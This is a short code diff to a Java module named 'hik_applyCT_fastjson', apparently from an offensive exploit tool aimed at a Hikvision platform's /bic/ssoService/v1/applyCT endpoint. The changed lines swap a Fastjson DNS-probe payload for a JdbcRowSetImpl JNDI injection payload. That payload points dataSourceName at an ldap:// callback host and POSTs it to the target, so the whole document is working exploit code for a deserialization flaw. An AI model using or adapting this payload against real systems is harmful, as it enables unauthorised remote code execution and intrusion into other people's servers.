@@ -5,7 +5,6 @@ import Utilss.Response;
 import Utilss.shell;
 import core.Exploitlnterface;
 import javafx.scene.control.TextArea;
-
 import java.util.HashMap;
 
 public class hik_applyCT_fastjson implements Exploitlnterface {
@@ -28,8 +27,7 @@ public class hik_applyCT_fastjson implements Exploitlnterface {
         Response dns_le1 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
         int dns_1 = dns_le1.getText().length();
 
-        String pay_1 = "{\"a\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.net.URL\",\"val\":\"" +
-                shell.readFile(shell.dnspath) + "\"}}\"\"}";
+        String pay_1 = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + shell.getRandomString() + "." + shell.readFile(shell.dnspath).replace("http://","") + "/\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}";
         Response post = HttpTools.post(url + "/bic/ssoService/v1/applyCT", pay_1, head, "utf-8");
 
         try { Thread.sleep (5000) ;
